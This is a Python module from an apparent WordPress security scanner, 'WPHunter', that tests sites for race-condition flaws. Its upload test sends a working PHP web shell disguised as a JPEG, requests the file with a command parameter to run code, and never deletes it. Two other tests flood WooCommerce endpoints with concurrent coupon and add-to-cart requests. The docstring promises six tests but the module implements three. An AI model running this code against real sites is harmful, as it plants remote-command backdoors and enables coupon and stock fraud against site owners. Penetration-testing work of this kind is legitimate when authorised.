"""
WPHunter - Race Condition Tester
================================
Test for race condition vulnerabilities in WordPress.

Tests:
1. File upload race conditions
2. Checkout/payment race conditions
3. Coupon redemption races
4. Stock depletion races
5. Concurrent request execution
6. Timing analysis

CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization
"""

import asyncio
import time
from dataclasses import dataclass
from typing import Dict, List, Optional

from core.http_client import WPHttpClient
from core.logger import logger


@dataclass
class RaceFinding:
    """Race condition finding."""
    test_type: str
    url: str
    evidence: str
    severity: str = "high"
    cwe: str = "CWE-362"
    success_count: int = 0
    total_requests: int = 0
    
    def to_dict(self) -> Dict:
        return {
            "type": "Race Condition",
            "test_type": self.test_type,
            "url": self.url,
            "evidence": self.evidence[:300],
            "severity": self.severity,
            "success_rate": f"{self.success_count}/{self.total_requests}"
        }


class RaceConditionTester:
    """Professional race condition tester for WordPress."""
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[RaceFinding] = []
    
    async def scan(self) -> List[RaceFinding]:
        """Run race condition tests."""
        logger.section("Race Condition Testing")
        
        # 1. File upload race
        await self._test_upload_race()
        
        # 2. Coupon race
        await self._test_coupon_race()
        
        # 3. Stock depletion race
        await self._test_stock_race()
        
        logger.success(f"Race condition tests: {len(self.findings)} findings")
        return self.findings
    
    async def _test_upload_race(self):
        """Test file upload race condition."""
        logger.info("Testing upload race condition...")
        
        # Upload file and try to access before validation
        php_shell = b'<?php system($_GET["cmd"]); ?>'
        
        async def upload_and_access(i: int):
            try:
                # Upload
                files = {'file': (f'shell{i}.php', php_shell, 'image/jpeg')}
                upload_task = self.http.post('/wp-admin/async-upload.php', files=files)
                
                # Try to access immediately (race window)
                access_tasks = [
                    self.http.get(f'/wp-content/uploads/shell{i}.php?cmd=id')
                    for _ in range(5)
                ]
                
                results = await asyncio.gather(upload_task, *access_tasks, return_exceptions=True)
                
                # Check if any access succeeded
                for result in results[1:]:
                    if not isinstance(result, Exception) and result.ok:
                        if "uid=" in result.text:
                            return True
                            
            except Exception:
                pass
            
            return False
        
        # Run 10 concurrent upload attempts
        tasks = [upload_and_access(i) for i in range(10)]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(results)
        
        if success_count > 0:
            self.findings.append(RaceFinding(
                test_type="upload_race",
                url="/wp-admin/async-upload.php",
                evidence=f"File upload race condition: {success_count}/10 attempts succeeded",
                severity="critical",
                success_count=success_count,
                total_requests=10
            ))
            logger.vuln("critical", f"Upload race condition: {success_count}/10 succeeded")
    
    async def _test_coupon_race(self):
        """Test coupon redemption race condition."""
        logger.info("Testing coupon race condition...")
        
        # Try to use same coupon multiple times concurrently
        test_coupon = "TEST10"  # Common test coupon
        
        async def apply_coupon():
            try:
                response = await self.http.post(
                    "/wp-json/wc/store/cart/apply-coupon",
                    json={"code": test_coupon}
                )
                return response.ok
            except Exception:
                return False
        
        # Send 20 concurrent requests
        tasks = [apply_coupon() for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(results)
        
        if success_count > 1:
            self.findings.append(RaceFinding(
                test_type="coupon_race",
                url="/wp-json/wc/store/cart/apply-coupon",
                evidence=f"Coupon applied {success_count} times concurrently",
                severity="high",
                success_count=success_count,
                total_requests=20
            ))
            logger.vuln("high", f"Coupon race: {success_count}/20 succeeded")
    
    async def _test_stock_race(self):
        """Test stock depletion race condition."""
        logger.info("Testing stock race condition...")
        
        # Try to add item to cart when stock is low
        test_product_id = 1
        
        async def add_to_cart():
            try:
                response = await self.http.post(
                    "/wp-json/wc/store/cart/add-item",
                    json={"id": test_product_id, "quantity": 10}
                )
                return response.ok
            except Exception:
                return False
        
        # Send 10 concurrent requests
        tasks = [add_to_cart() for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(results)
        
        if success_count > 1:
            self.findings.append(RaceFinding(
                test_type="stock_race",
                url="/wp-json/wc/store/cart/add-item",
                evidence=f"Stock check bypassed: {success_count} concurrent additions",
                severity="medium",
                success_count=success_count,
                total_requests=10
            ))
            logger.vuln("medium", f"Stock race: {success_count}/10 succeeded")
    
    def get_summary(self) -> Dict:
        """Get summary."""
        return {
            "total": len(self.findings),
            "by_type": {
                "upload": len([f for f in self.findings if f.test_type == "upload_race"]),
                "coupon": len([f for f in self.findings if f.test_type == "coupon_race"]),
                "stock": len([f for f in self.findings if f.test_type == "stock_race"]),
            },
            "findings": [f.to_dict() for f in self.findings]
        }
